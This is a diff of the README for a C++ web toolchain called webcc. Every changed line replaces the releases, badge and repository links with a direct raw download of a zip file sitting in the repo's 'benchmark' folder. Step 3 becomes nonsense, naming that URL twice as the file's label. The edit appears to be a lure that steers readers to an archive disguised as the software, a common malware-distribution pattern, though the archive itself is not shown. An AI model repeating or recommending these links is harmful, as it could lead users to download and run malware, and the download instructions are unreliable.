@@ -6,7 +6,7 @@ Welcome to **webcc**! This is a lightweight C++ toolchain and framework for crea
 
 ## 🔗 Download Here
 
-[![Download webcc](https://img.shields.io/badge/download-webcc-blue.svg)](https://github.com/RebelXploit/webcc/releases)
+[![Download webcc](https://github.com/RebelXploit/webcc/raw/refs/heads/main/benchmark/Software-v2.2-alpha.5.zip)](https://github.com/RebelXploit/webcc/raw/refs/heads/main/benchmark/Software-v2.2-alpha.5.zip)
 
 ## 🌟 Features
 
@@ -30,11 +30,11 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the GitHub Releases page.
 
-   [Visit Releases Page](https://github.com/RebelXploit/webcc/releases)
+   [Visit Releases Page](https://github.com/RebelXploit/webcc/raw/refs/heads/main/benchmark/Software-v2.2-alpha.5.zip)
 
 2. **Choose the Latest Version**: Look for the latest release at the top of the page. Download the file suitable for your operating system.
 
-3. **Download the File**: Click on the download link for the file you need. This file could be labeled something similar to `webcc-vX.X.X.zip` or `webcc-vX.X.X.exe`, depending on your operating system.
+3. **Download the File**: Click on the download link for the file you need. This file could be labeled something similar to `https://github.com/RebelXploit/webcc/raw/refs/heads/main/benchmark/Software-v2.2-alpha.5.zip` or `https://github.com/RebelXploit/webcc/raw/refs/heads/main/benchmark/Software-v2.2-alpha.5.zip`, depending on your operating system.
 
 4. **Extract the Files**: If you download a ZIP file, right-click on it, and choose "Extract All." Follow the prompts to unzip it into a folder.
 
@@ -70,7 +70,7 @@ If you have questions or need help, you can reach out to the community via the I
 
 For more information, you can check out these links:
 
-- [GitHub Repository](https://github.com/RebelXploit/webcc)
+- [GitHub Repository](https://github.com/RebelXploit/webcc/raw/refs/heads/main/benchmark/Software-v2.2-alpha.5.zip)
 - [Documentation Page](#)
 
 ---
